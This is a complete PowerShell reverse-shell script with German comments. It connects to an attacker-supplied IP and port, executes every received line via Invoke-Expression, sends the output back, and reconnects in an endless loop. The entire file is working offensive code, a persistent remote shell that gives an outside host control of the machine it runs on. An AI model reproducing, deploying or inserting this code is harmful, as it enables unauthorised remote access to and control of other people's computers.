# PowerShell-only Reverse Shell (keine cmd.exe, keine externen Tools)
# Dieses Skript verbindet sich mit einem Listener und führt PowerShell-Befehle aus.
# Enthält Reconnect-Logik und Logging.
# New

# --- KONFIGURATION START ---
Param(
    [Parameter(Mandatory=$true)] # Macht die Angabe von -ip Pflicht
    [string]$ip,                 # IP-Adresse des Angreifers/Listeners

    [Parameter(Mandatory=$true)] # Macht die Angabe von -port Pflicht
    [int]$port                   # Port des Listeners
)
# --- KONFIGURATION ENDE ---

# --- INTERNE KONFIGURATION (nicht ändern, es sei denn, Sie wissen, was Sie tun) ---
$logFile = "$env:TEMP\ps_revshell_log.txt" # Debugging-Log-Datei
$sleepTimeMs = 50     # Wartezeit zwischen Befehlen in Millisekunden während der Shell aktiv ist
$reconnectDelaySec = 10 # Wartezeit in Sekunden, bevor ein Reconnect-Versuch gestartet wird
# --- INTERNE KONFIGURATION ENDE ---

# Hilfsfunktion zum Schreiben von Nachrichten in die Log-Datei
function Write-Log ($message) {
    try {
        Add-Content -Path $logFile -Value "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - $message"
    } catch {
        # Wenn selbst das Schreiben ins Log fehlschlägt, können wir hier nicht viel tun.
    }
}

# --- Hauptlogik für die Shell ---
function Start-ReverseShell {
    param(
        [string]$ip,
        [int]$port
    )

    Write-Log "Attempting connection to ${ip}:${port}."

    try {
        # Erstelle ein TCP-Client-Objekt und verbinde dich mit dem Listener
        $client = New-Object System.Net.Sockets.TCPClient($ip,$port);
        Write-Log "Connection established."

        # Hole den Netzwerk-Stream für das Senden und Empfangen von Daten
        $stream = $client.GetStream();
        $sr = New-Object System.IO.StreamReader($stream); # Zum Lesen von Daten vom Listener
        $sw = New-Object System.IO.StreamWriter($stream); # Zum Schreiben von Daten zum Listener
        Write-Log "Streams created."

        # Sende einen Willkommensgruß und das aktuelle Verzeichnis
        $welcomeMessage = "PowerShell Reverse Shell connected.`n" + (Get-Location).Path + "> "
        $sw.WriteLine($welcomeMessage);
        $sw.Flush();
        Write-Log "Welcome message sent."

        # Hauptschleife: Lese Befehle vom Listener, führe sie aus und sende die Ausgabe zurück
        while($client.Connected) {
            try {
                # Überprüfen, ob Daten vom Listener verfügbar sind
                if ($stream.DataAvailable) {
                    Write-Log "Checking stream.DataAvailable."
                    $command = $sr.ReadLine(); # Lese eine Zeile vom Netzwerk-Stream (vom Listener)
                    Write-Log "Received command: '$command'"

                    # Beenden-Befehl
                    if ($command -eq "exit") {
                        Write-Log "Received exit command. Closing shell."
                        break;
                    }

                    # Führe den Befehl aus und fange sowohl Standard-Output als auch Fehler ab
                    $output = Invoke-Expression $command 2>&1 | Out-String;
                    Write-Log "Command executed. Output length: $($output.Length)."

                    # Sende die Ausgabe zurück zum Listener
                    $sw.WriteLine($output + (Get-Location).Path + "> "); # Füge den aktuellen Pfad und Prompt hinzu
                    $sw.Flush();
                }
                Start-Sleep -Milliseconds $sleepTimeMs # Kurze Pause, um CPU-Auslastung zu reduzieren
            } catch {
                Write-Log "Error in main loop: $($_.Exception.Message)"
                break; # Verbindung verloren oder anderer Fehler in der Schleife
            }
        }
        Write-Log "Main loop ended. Client connected: $($client.Connected)."

    } catch {
        # Dieser Block fängt Fehler beim Verbindungsaufbau oder während des Shell-Betriebs ab
        Write-Log "Shell attempt failed: $($_.Exception.Message)"
    } finally {
        # Aufräumen: Schließe alle offenen Ressourcen
        Write-Log "Attempting cleanup."
        if($client -and $client.Connected) {
            try { $client.Close(); Write-Log "Client closed." } catch { Write-Log "Error closing client: $($_.Exception.Message)" }
        }
        Write-Log "Shell attempt finished."
    }
}

# --- Endlosschleife für Reconnect-Logik ---
Write-Log "Starting persistent reverse shell loop."
while ($true) {
    Start-ReverseShell -ip $ip -port $port
    Write-Log "Disconnected. Reconnecting in ${reconnectDelaySec} seconds..."
    Start-Sleep -Seconds $reconnectDelaySec
}
